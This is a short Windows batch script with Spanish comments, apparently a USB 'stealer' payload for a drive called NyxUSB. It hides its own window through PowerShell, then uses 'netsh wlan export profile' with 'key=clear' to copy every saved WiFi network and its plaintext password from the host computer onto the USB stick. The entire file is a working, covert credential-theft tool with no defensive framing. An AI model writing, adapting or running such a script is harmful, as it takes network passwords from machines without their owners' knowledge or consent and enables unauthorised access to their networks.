@echo off

:: 1. El script se oculta a si mismo inmediatamente
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit
)

:: 2. AUTO-DETECCION: Encuentra la letra de la USB NyxUSB
set "DRIVE=%~d0"
set "FOLDER_DATA=%DRIVE%\Data"

:: 3. Crear la carpeta Data en la USB si no existe
if not exist "%FOLDER_DATA%" (
    mkdir "%FOLDER_DATA%"
)

:: 4. Exportar perfiles WiFi usando comandos nativos de Windows hacia la carpeta Data
:: Esto genera un archivo XML por cada red WiFi guardada en el sistema
netsh wlan export profile folder="%FOLDER_DATA%" key=clear >nul 2>&1

exit